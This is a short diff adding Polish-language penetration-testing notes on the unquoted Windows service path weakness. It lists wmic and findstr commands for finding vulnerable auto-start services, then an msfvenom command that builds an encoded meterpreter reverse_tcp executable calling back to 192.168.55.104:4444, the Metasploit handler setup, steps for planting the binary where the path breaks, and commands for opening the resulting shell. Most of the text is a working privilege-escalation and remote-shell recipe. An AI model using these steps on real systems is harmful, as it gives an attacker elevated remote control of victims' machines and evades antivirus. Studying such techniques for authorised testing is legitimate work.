@@ -1,0 +1,45 @@
+Opis:
+ Jezeli w adresie programu do odpalenia nie ma cudzyslowia a w srodku jest spacja to zadziala to jak podfolder.
+ W tym miejscu mozemy podlozyc swoj program ktory zostanie znaleziony wczesniej niz wlasciwy i wykonany z uprawnieniami zadanymi przez system.
+
+Jezeli jakas sciezka bedzie podana bez cudzyslowia a w srodku bedzie miala spacje to mozemy ja wykozystac.
+
+ 
+Commands: 
+	 Komenda wylistuje serwisy antywirusa
+→ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v “'” 
+
+	Komenda wylistuje wszystkie serwisy:
+→ wmic service get name,displayname,pathname,startmode  
+
+ 
+ 
+w konsoli cmd:
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v “'” 
+
+ 
+Example rivershell to linux:
+Tworzymy binarke na linuxie programem msfvenom (do meterpretera):
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.55.104 LPORT=4444 -e x64/zutto_dekiru -i 20 -f exe -o nazwa.exe
+
+ 
+Wytworzony plik przerzucamy do windowsa
+Na linuxie odpalamy msfconsole I wpisujemy “use multi/handler” I zaczynamy nasluchiwac na tym porcie
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.55.104
+set LPORT 4444
+options
+run -j
+W tym miejscu na linuxie msfconsole czeka na ruch na windowsie (wystarczy odpalic nasz plik)
+
+ 
+Na windowsie 
+Przenosimy plik do folderu w ktorym sciezka sie urywa (jest ta znaleziona spacja) i nadajemy nazwe.
+Nazwa musi byc taka sama jak wlasciwego programu.
+No i teraz musimy odpalic program np. jezeli program uruchamia sie przy starcie systemu to czekamy na restart.
+
+ 
+Na linuxie:
+sessions (widzimy numer sesji)
+sessions -i <dajemy_numer>
+I mam konsole meterpretera
